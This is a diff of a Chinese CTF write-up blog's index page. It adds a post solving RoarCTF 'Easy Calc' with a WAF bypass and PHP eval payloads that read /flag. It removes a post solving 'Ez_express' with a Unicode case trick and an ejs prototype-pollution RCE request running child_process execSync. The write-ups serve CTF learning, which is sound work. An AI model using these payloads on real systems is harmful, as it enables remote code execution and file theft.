@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-count">74</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-count">88</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,129 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/" class="post-title-link" itemprop="url">BUUOJ-刷题-Web-Easy-Calc</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-25 23:18:07" itemprop="dateCreated datePublished" datetime="2020-07-25T23:18:07+08:00">2020-07-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-08-27 14:50:50" itemprop="dateModified" datetime="2020-08-27T14:50:50+08:00">2020-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>RoarCTF的Easy Calc。</p>
+<p>又来万恶的计算器了。</p>
+<p>开题就是个输入表达式的页面，注释提示他上了WAF。但是是什么WAF，暂时不清楚。</p>
+<p>输入会AJAX发到calc.php里，我们直接打开calc.php发现给了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>不允许空格、单双引号、反引号、中括号、$、^、。但是实际上我们在num参数那里输入任何字母都会返回403？403很有意思，calc.php肯定可以正常访问，但我们输入字母后返回403，结合之前的WAF提示，猜测是WAF拦截造成的。</p>
+<p>注意一个问题，WAF不一定是PHP级别的WAF，Apache上搞个modsecurity也叫WAF。而如果WAF不能正确理解PHP的特性，就可能造成绕过。详细请参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">这个</a>。</p>
+<p>那么，我们尝试在URL那里加个空格绕过？输入<code>? num=a</code>，发现正常返回了a，那就好办了。构造Payload。</p>
+<p>可以用小括号与<code>.</code>，尝试读目录，scandir需要一个字符串作为参数，由于单双引号被过滤，我们可以使用chr()与<code>.</code>拼接。提交<code>? num=1;scandir(chr(46))</code>，没看到flag，那就看根目录<code>? num=1;scandir(chr(47))</code>，发现有flag，读就完事了。<code>? num=1;show_source(chr(47).chr(102).chr(108).chr(97).chr(103))</code>。</p>
+
+    <div id="aplayer-FLSIYsUd" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="27731369" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{b39e2900-9680-4e81-b077-fa1b0fd8fba9}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1363,128 +1486,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-Ez_express</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-03-02 11:10:57 / 修改时间：16:55:11" itemprop="dateCreated datePublished" datetime="2020-03-02T11:10:57+08:00">2020-03-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>4k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>2020 i春秋新春公益赛的Ez_express，NodeJS的题。</p>
-<p>开题提示我们用ADMIN登录，随便注册一下页面注释提示www.zip。看一下app.js，Express框架的程序，index页面指向routes/index.js。</p>
-<p>login路由有点东西： <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;register&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (safeKeyword(req.body.userid)) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        req.session.user = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: req.body.userid.toUpperCase(),</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">            <span class="string">&#x27;isLogin&#x27;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;login&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.session.user) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;</span><br><span class="line">            req.session.user.isLogin = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure> safeKeyword()使得我们注册的时候不能用"admin"，而题目又要求我们用admin用户名登录。注意到在register()里用户名特别的加了一步toUppercase()操作，这是干什么用的？</p>
-<p>参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">这里</a>，Javascript在处理某些语系特定字符的时候会有些意外，我们可以用<code>ı</code>来代替<code>i</code>，除了上文提到的几个，<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1850232/turkish-case-conversion-in-javascript">这里</a>还有补充。</p>
-<p>因此我们注册一个<code>admın</code>用户即可绕过限制了。然后就让我们提交你最喜欢的语言？？？ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123;</span><br><span class="line">        res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>我们POST过去的东西被clone()到了req.body对象里。 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> 这就涉及到新的知识点了，原型链污染。具体参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6e623e9debe3">这里</a>、<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">这里</a>和<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-3">这里</a>。简单来说，JavaScript里绝大部分对象继承了Object对象，例如String对象就继承于String类（function等同于class），又继承于Object对象。那么String对象的原型就是String类，如下图所示：</p>
-<div class="mermaid">
-graph LR
-A[&quot;Object()&quot;]--&gt;|Prototype|B[&quot;function String()&quot;]
-B--&gt;|Prototype|C[&quot;123&quot;]
-</div>
-<p>这条继承链就叫做原型链。我们如果在function String()里添加方法或属性，继承它的'123'会添加相同的方法属性。而JavaScript在访问某对象属性或方法时是从原型链起始Object()开始查找，直到最后的目标。因此假设我们为Object()添加了个toUppercase()方法，最后'123'.toUppercase()就会优先调用Object()的toUppercase()，这样toUppercase()就被我们污染了，这种攻击方法就叫原型链污染。注意一点，原型链污染的时候我们需要传入JSON数据，即发包的Content-type要变成application/json，否则__proto__不会覆盖。</p>
-<p>回到题目，下面的问题是我们的输入怎样污染呢？注意到在route('/')的时候有点东西： <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.user) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.outputFunctionName = <span class="literal">undefined</span>;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, data = &#123;<span class="string">&#x27;user&#x27;</span>: req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure> 为什么多出来个outputFunctionName？本题的渲染引擎用的ejs，貌似在刚才的参考文章里提到可以造成RCE。</p>
-<p>所以，我们抄一下RCE的Payload<code>a; return global.process.mainModule.constructor._load('child_process').execSync('whoami');</code>。发包吧： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 146</span><br><span class="line"><span class="attribute">Origin</span>: http://56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://54830c3c-4435-4ff0-814f-a9cfc97ec6d0.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: _ga=GA1.2.744187123.1582874453;  session=s%3AuujbI4q6GPRCu7MQpsxrcvFqt0tTzzAV.jGfKfFz5gfEczv2Yw1LCl1nHqwMEsY2k6Zup91j0X88</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;); //&quot;&#125;&#125;</span><br></pre></td></tr></table></figure> 提交后刷新页面即可得到flag。</p>
-
-    <div id="aplayer-zbVpSGMt" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="4164331" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{3fa89b5f-528d-434b-9ada-e93a864b2969}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1541,14 +1542,14 @@ B--&gt;|Prototype|C[&quot;123&quot;]
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">306k</span>
+    <span title="站点总字数">318k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:38</span>
+    <span title="站点阅读时长">4:49</span>
   </span>
 </div>
 <div class="busuanzi-count">
